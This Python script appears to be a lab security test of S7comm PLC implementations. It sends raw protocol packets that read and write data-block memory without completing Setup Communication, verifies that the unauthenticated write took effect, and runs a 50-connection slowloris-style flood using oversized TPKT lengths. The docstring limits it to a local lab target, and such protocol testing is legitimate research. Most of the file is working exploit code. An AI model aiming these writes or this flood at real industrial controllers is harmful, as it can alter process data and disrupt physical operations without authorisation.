#!/usr/bin/env python3
"""
S7comm Protocol Test - Phase 5 (Extended): State Manipulation & Protocol Anomalies
-----------------------------------------------------------------------------------
Objective: Explore advanced protocol anomalies, including state-machine bypasses,
unsolicited writes, and resource-exhaustion patterns, to assess the robustness of
S7comm implementations against non-standard or maliciously crafted traffic.
Note: This script is intended for controlled lab environments only. Do not run
against production systems or networks without explicit permission. The tests
may cause service disruption or unexpected behavior on the target PLC. Always
ensure you have authorization and are operating in a safe, isolated environment.
Run only against your own local lab stack (127.0.0.1).
"""

import socket
import struct
import threading
import time

from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich import box

console = Console()

TARGET_HOST = "127.0.0.1"
TARGET_PORT = 102
SRC_TSAP    = 0x0100
DST_TSAP    = 0x0102  # Rack 0, Slot 2

DB_NUMBER   = 3        # confirmed-present DB on this lab target

HELD_FLOOD_CONNECTIONS = 50
HELD_FLOOD_HOLD_TIME   = 15.0   # seconds to keep the half-sent frame open
FLOOD_TIMEOUT           = 5.0

# --- Shared protocol builders (same as Phase 5 base script) ----------------

def build_cotp_cr(src_tsap: int, dst_tsap: int) -> bytes:
    tpkt = bytes([0x03, 0x00, 0x00, 0x16])
    cotp = bytes([
        0x11, 0xE0, 0x00, 0x00, 0x00, 0x01, 0x00,
        0xC1, 0x02, (src_tsap >> 8) & 0xFF, src_tsap & 0xFF,
        0xC2, 0x02, (dst_tsap >> 8) & 0xFF, dst_tsap & 0xFF,
        0xC0, 0x01, 0x0A,
    ])
    return tpkt + cotp


def build_s7_setup_comm(pdu_ref: int = 1) -> bytes:
    s7_pdu = bytes([
        0x32, 0x01, 0x00, 0x00,
        (pdu_ref >> 8) & 0xFF, pdu_ref & 0xFF,
        0x00, 0x08, 0x00, 0x00,
        0xF0, 0x00, 0x00, 0x01, 0x00, 0x01, 0x01, 0xE0,
    ])
    tpkt_len = 4 + 3 + len(s7_pdu)
    tpkt = bytes([0x03, 0x00, (tpkt_len >> 8) & 0xFF, tpkt_len & 0xFF])
    cotp_dt = bytes([0x02, 0xF0, 0x80])
    return tpkt + cotp_dt + s7_pdu


def _item_spec(db_number: int, byte_address: int, area: int, transport_size: int, num_elements: int = 1) -> bytes:
    bit_address = byte_address << 3
    return bytes([
        0x12, 0x0A, 0x10, transport_size,
        (num_elements >> 8) & 0xFF, num_elements & 0xFF,
        (db_number >> 8) & 0xFF, db_number & 0xFF,
        area,
        (bit_address >> 16) & 0xFF,
        (bit_address >> 8) & 0xFF,
        bit_address & 0xFF,
    ])


def build_read_var_request(pdu_ref: int = 1, db_number: int = DB_NUMBER,
                            byte_address: int = 0, area: int = 0x84) -> bytes:
    """Standard S7 Job (ROSCTR 0x01) ReadVar request for one BYTE at DB/address."""
    item_spec = _item_spec(db_number, byte_address, area, transport_size=0x02)
    param = bytes([0x04, 0x01]) + item_spec  # Function 0x04 = Read Var, 1 item

    s7_header = struct.pack(">BBHHHH", 0x32, 0x01, 0x0000, pdu_ref, len(param), 0x0000)
    pdu = s7_header + param
    tpkt_len = 4 + 3 + len(pdu)
    return bytes([0x03, 0x00, (tpkt_len >> 8) & 0xFF, tpkt_len & 0xFF, 0x02, 0xF0, 0x80]) + pdu


def build_write_var_request(pdu_ref: int = 1, db_number: int = DB_NUMBER,
                             byte_address: int = 0, area: int = 0x84,
                             value: bytes = b"\x41") -> bytes:
    """
    S7 Job (ROSCTR 0x01) WriteVar request, function 0x05, writing `value`
    (default single byte 0x41 = 'A') to DB_NUMBER.byte_address.
    """
    item_spec = _item_spec(db_number, byte_address, area, transport_size=0x02, num_elements=len(value))
    param = bytes([0x05, 0x01]) + item_spec  # Function 0x05 = Write Var, 1 item

    data_len_bits = len(value) * 8
    # Data item: return code (0xFF placeholder on request), transport size code (0x04=BYTE/WORD/DWORD, 0x02 also seen),
    # length in bits/bytes depending on transport, then the payload, padded to even length.
    data_item = bytes([0x00, 0x04, (data_len_bits >> 8) & 0xFF, data_len_bits & 0xFF]) + value
    if len(data_item) % 2 != 0:
        data_item += b"\x00"

    s7_header = struct.pack(">BBHHHH", 0x32, 0x01, 0x0000, pdu_ref, len(param), len(data_item))
    pdu = s7_header + param + data_item
    tpkt_len = 4 + 3 + len(pdu)
    return bytes([0x03, 0x00, (tpkt_len >> 8) & 0xFF, tpkt_len & 0xFF, 0x02, 0xF0, 0x80]) + pdu


def format_hex_dump(data: bytes, max_bytes: int = 64) -> str:
    lines = []
    for i in range(0, min(len(data), max_bytes), 16):
        chunk = data[i:i + 16]
        hex_part = " ".join(f"{b:02X}" for b in chunk).ljust(47)
        ascii_part = "".join(chr(b) if 32 <= b <= 126 else "." for b in chunk)
        lines.append(f"  [cyan]{i:04X}[/cyan]  {hex_part}  |[bold white]{ascii_part}[/bold white]|")
    if len(data) > max_bytes:
        lines.append(f"  ... ({len(data) - max_bytes} more bytes truncated)")
    return "\n".join(lines) if lines else "  (empty)"


def probe_liveness() -> bool:
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2.0)
        sock.connect((TARGET_HOST, TARGET_PORT))
        sock.sendall(build_cotp_cr(SRC_TSAP, DST_TSAP))
        resp = sock.recv(1024)
        sock.close()
        return bool(resp) and len(resp) >= 6 and resp[5] == 0xD0
    except Exception:
        return False


def _decode_return_code(code: int) -> str:
    return {
        0x00: "Reserved",
        0x01: "Hardware fault",
        0x03: "Accessing the object not allowed",
        0x05: "Invalid address",
        0x06: "Data type not supported",
        0x0A: "Object does not exist",
        0xFF: "Success",
    }.get(code, f"Unknown (0x{code:02X})")


# --- 5.1b -- State-machine bypass, rerun against DB that exists ------------

def test_state_machine_bypass_db3():
    console.print(Panel(
        "[bold yellow]5.1b -- State-Machine Bypass (DB3, confirmed present)[/bold yellow]\n"
        "[dim]Rerun of 5.1 against a DB that actually exists on the target, "
        "to distinguish 'no such DB' from a real pre-handshake read.[/dim]",
        expand=False,
    ))

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3.0)
        sock.connect((TARGET_HOST, TARGET_PORT))

        sock.sendall(build_cotp_cr(SRC_TSAP, DST_TSAP))
        resp = sock.recv(1024)
        if not resp or len(resp) < 6 or resp[5] != 0xD0:
            console.print("[bold red][!] COTP handshake failed; cannot proceed.[/bold red]")
            sock.close()
            return

        console.print(f"[green][+] COTP session established. Skipping Setup Communication. Reading DB{DB_NUMBER}.0[/green]")

        packet = build_read_var_request(pdu_ref=1, db_number=DB_NUMBER, byte_address=0)
        sock.sendall(packet)

        try:
            resp = sock.recv(2048)
        except socket.timeout:
            console.print("[bold red][!] No response -- timeout.[/bold red]")
            sock.close()
            return

        if not resp:
            console.print("[bold red][!] Connection closed with no data.[/bold red]")
        else:
            console.print(f"[green][+] Server responded ({len(resp)} bytes):[/green]")
            console.print(Panel(format_hex_dump(resp), title="Raw Response", expand=False))
            if len(resp) >= 22:
                rosctr = resp[8]
                item_return_code = resp[21] if len(resp) > 21 else None
                console.print(f"[dim]ROSCTR: 0x{rosctr:02X}[/dim]")
                if item_return_code is not None:
                    console.print(f"[bold]Item return code: 0x{item_return_code:02X} -- "
                                  f"{_decode_return_code(item_return_code)}[/bold]")
                    if item_return_code == 0xFF:
                        console.print("[bold red][!!] Live data returned with NO Setup Communication "
                                      "having occurred. Confirmed pre-handshake read primitive.[/bold red]")
        sock.close()

    except Exception as e:
        console.print(f"[bold red][!] Execution Error: {e}[/bold red]")


# --- 5.4 -- WriteVar bypass -------------------------------------------------

def test_writevar_bypass():
    console.print(Panel(
        "[bold yellow]5.4 -- WriteVar State-Machine Bypass[/bold yellow]\n"
        "[dim]Sending an unsolicited WriteVar directly after COTP CR/CC, "
        "skipping Setup Communication. This is a materially different risk "
        "than a read bypass -- a successful write pre-handshake means an "
        "unauthenticated peer can mutate process data without ever "
        "negotiating a PDU size.[/dim]",
        expand=False,
    ))

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3.0)
        sock.connect((TARGET_HOST, TARGET_PORT))

        sock.sendall(build_cotp_cr(SRC_TSAP, DST_TSAP))
        resp = sock.recv(1024)
        if not resp or len(resp) < 6 or resp[5] != 0xD0:
            console.print("[bold red][!] COTP handshake failed; cannot proceed.[/bold red]")
            sock.close()
            return

        console.print(f"[green][+] COTP session established. Skipping Setup Communication. "
                      f"Writing 0x41 to DB{DB_NUMBER}.0[/green]")

        packet = build_write_var_request(pdu_ref=1, db_number=DB_NUMBER, byte_address=0, value=b"\x41")
        sock.sendall(packet)

        try:
            resp = sock.recv(2048)
        except socket.timeout:
            console.print("[bold red][!] No response -- timeout, request silently dropped.[/bold red]")
            sock.close()
            return

        if not resp:
            console.print("[bold red][!] Connection closed with no data -- write rejected at session level.[/bold red]")
        else:
            console.print(f"[green][+] Server responded ({len(resp)} bytes):[/green]")
            console.print(Panel(format_hex_dump(resp), title="Raw Response", expand=False))
            if len(resp) >= 20:
                rosctr = resp[8]
                write_return_code = resp[19] if len(resp) > 19 else None
                console.print(f"[dim]ROSCTR: 0x{rosctr:02X}[/dim]")
                if write_return_code is not None:
                    console.print(f"[bold]Write item return code: 0x{write_return_code:02X} -- "
                                  f"{_decode_return_code(write_return_code)}[/bold]")
                    if write_return_code == 0xFF:
                        console.print("[bold red][!!] WRITE SUCCEEDED with no Setup Communication. "
                                      "Confirm the byte actually changed with an authenticated read.[/bold red]")
        sock.close()

        # Follow-up: read back the same byte through a proper, fully-negotiated session
        console.print("\n[dim]Reading back DB{}.0 via a fully negotiated session to confirm the write stuck...[/dim]".format(DB_NUMBER))
        verify_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        verify_sock.settimeout(3.0)
        verify_sock.connect((TARGET_HOST, TARGET_PORT))
        verify_sock.sendall(build_cotp_cr(SRC_TSAP, DST_TSAP))
        r = verify_sock.recv(1024)
        if r and len(r) >= 6 and r[5] == 0xD0:
            verify_sock.sendall(build_s7_setup_comm(pdu_ref=1))
            r2 = verify_sock.recv(1024)
            if r2 and len(r2) >= 12 and r2[8] == 0x03:
                verify_sock.sendall(build_read_var_request(pdu_ref=2, db_number=DB_NUMBER, byte_address=0))
                r3 = verify_sock.recv(1024)
                if r3:
                    console.print(Panel(format_hex_dump(r3), title="Verification Read", expand=False))
                    if len(r3) >= 25 and r3[21] == 0xFF:
                        read_back_value = r3[25] if len(r3) > 25 else None
                        console.print(f"[bold]Read-back value: 0x{read_back_value:02X}[/bold]" if read_back_value is not None else "")
        verify_sock.close()

    except Exception as e:
        console.print(f"[bold red][!] Execution Error: {e}[/bold red]")


# --- 5.5 -- Held-open oversized-TPKT flood ----------------------------------

def _held_flood_worker(index: int, results: list, lock: threading.Lock):
    """
    Completes COTP + Setup Communication normally, then sends a ReadVar
    frame whose TPKT length claims more bytes than are actually sent, and
    holds the socket open (does NOT close it) for HELD_FLOOD_HOLD_TIME
    seconds -- mirroring a slow-loris pattern on top of the 5.2 finding
    that moderately-oversized TPKT lengths cause the server to block on
    partial-frame reassembly rather than reject immediately.
    """
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(FLOOD_TIMEOUT)
        sock.connect((TARGET_HOST, TARGET_PORT))
        sock.sendall(build_cotp_cr(SRC_TSAP, DST_TSAP))
        resp = sock.recv(1024)
        if not resp or len(resp) < 6 or resp[5] != 0xD0:
            with lock:
                results.append((index, False, "COTP handshake failed"))
            sock.close()
            return

        sock.sendall(build_s7_setup_comm(pdu_ref=1))
        resp = sock.recv(1024)
        if not resp or len(resp) < 12 or resp[8] != 0x03:
            with lock:
                results.append((index, False, "Setup Communication failed"))
            sock.close()
            return

        base = build_read_var_request(pdu_ref=2, db_number=DB_NUMBER, byte_address=0)
        oversized = bytearray(base)
        real_len = struct.unpack(">H", oversized[2:4])[0]
        struct.pack_into(">H", oversized, 2, real_len + 40)
        sock.sendall(bytes(oversized))

        # Hold the socket open without sending the "extra" bytes the length
        # field promised, and without closing -- this is the resource-
        # exhaustion probe. We do NOT try to read (that would just block
        # until FLOOD_TIMEOUT and defeat the point of holding it open).
        with lock:
            results.append((index, True, "held open"))
        time.sleep(HELD_FLOOD_HOLD_TIME)
        sock.close()

    except Exception as e:
        with lock:
            results.append((index, False, str(e)))


def test_held_open_oversized_flood():
    console.print(Panel(
        f"[bold yellow]5.5 -- Held-Open Oversized-TPKT Flood[/bold yellow]\n"
        f"[dim]Opening {HELD_FLOOD_CONNECTIONS} fully-negotiated sessions, each sending a "
        f"ReadVar with TPKT length +40 over actual payload, then holding the "
        f"socket open for {HELD_FLOOD_HOLD_TIME:.0f}s without sending the promised extra "
        f"bytes or closing. Watch server-side thread/fd count during this "
        f"window from another terminal, e.g.:\n"
        f"  ps -o nlwp <PID>\n"
        f"  lsof -p <PID> | wc -l\n"
        f"  ss -tnp | grep ':102'[/dim]",
        expand=False,
    ))

    if not probe_liveness():
        console.print("[bold red][!] Server not responsive before test -- aborting.[/bold red]")
        return

    results = []
    lock = threading.Lock()
    threads = [
        threading.Thread(target=_held_flood_worker, args=(i, results, lock))
        for i in range(HELD_FLOOD_CONNECTIONS)
    ]

    start = time.time()
    for t in threads:
        t.start()

    console.print(f"[dim]All {HELD_FLOOD_CONNECTIONS} connection attempts launched. "
                  f"Sockets will be held for {HELD_FLOOD_HOLD_TIME:.0f}s -- check server resource "
                  f"usage now.[/dim]")

    for t in threads:
        t.join()
    total_elapsed = time.time() - start

    held = [r for r in results if r[1]]
    failed = [r for r in results if not r[1]]

    table = Table(box=box.SIMPLE)
    table.add_column("Metric", style="dim cyan")
    table.add_column("Value", style="white")
    table.add_row("Connections attempted", str(HELD_FLOOD_CONNECTIONS))
    table.add_row("Successfully held open (partial frame)", f"[green]{len(held)}[/green]")
    table.add_row("Failed before hold started", f"[red]{len(failed)}[/red]" if failed else "0")
    table.add_row("Total wall time", f"{total_elapsed:.2f}s")
    console.print(table)

    if failed:
        console.print("\n[yellow]Sample failures:[/yellow]")
        for idx, ok, err in failed[:5]:
            console.print(f"  [dim]conn #{idx}:[/dim] {err}")

    console.print(f"\n[dim]Server liveness immediately after all sockets released: "
                  f"{'UP' if probe_liveness() else 'DOWN / UNRESPONSIVE'}[/dim]")


# --- Main --------------------------------------------------------------------

def main():
    console.print(Panel(
        "[bold cyan]S7comm Protocol Test -- Phase 5 Extended[/bold cyan]\n"
        "[dim]DB3 bypass rerun, WriteVar bypass, and held-open oversized-TPKT flood.[/dim]\n"
        "[bold red]Run only against your own local lab stack.[/bold red]",
        box=box.DOUBLE,
        style="bold white on blue",
    ))

    test_state_machine_bypass_db3()
    console.print()

    test_writevar_bypass()
    console.print()

    test_held_open_oversized_flood()


if __name__ == "__main__":
    main()